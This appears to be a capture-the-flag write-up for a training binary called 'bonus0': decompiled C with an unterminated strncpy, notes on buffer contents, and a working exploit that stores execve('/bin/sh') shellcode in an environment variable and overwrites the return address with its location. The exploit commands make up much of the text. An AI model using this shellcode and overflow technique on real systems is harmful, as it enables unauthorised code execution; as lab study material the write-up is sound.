void p(char *buf_1_2, char *s_dash)
{
	char buf_read[4120];			// 0xbfffe650
	
	puts(s_dash);
	read(0, buf_read, 4096);
	char *ret = strchr(buf_read, '\n');
	while (*ret)
		*ret++ = '\0';
	strncpy(buf_1_2, buf_read, 20);
}

void pp(char *buf_main)
{
	char buf_1[20];	// 0xbffff698
	char buf_2[20];	// 0xbffff6ac
	
	p(buf_1, " - ");
	p(buf_2, " - ");
	buf_main = strcpy(buf_main, buf_1);
	int i = 0;
	while (buf_main[i])
		i++;
	buf_main[i] = ' ';
	buf_main[i + 1] = '\0';
	strcat(buf_main, buf_2);
}

int main()
{
	char buf_main[42];		// 0xbffff6e6
	pp(buf_main);
	puts(buf_main);
}


buf_main[42] = "000000000000000000000000000000000000000 0000000000000000000\0";
buf_read[4120] = "0000000000000000000\0\0";
buf_1[20] = "00000000000000000000";
buf_2[20] = "0000000000000000000\0";

000000000000000000000000000000000000000 0000000000000000000


export SHELLCODE=$(python -c 'print "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
/tmp/getenv SHELLCODE ./bonus0
SHELLCODE found at 0xbffff8e7
python -c 'print "0"*4095 + "\n" + "0"*14 + "\xe7\xf8\xff\xbf\x12"' > /tmp/flag
cat /tmp/flag - | ./bonus0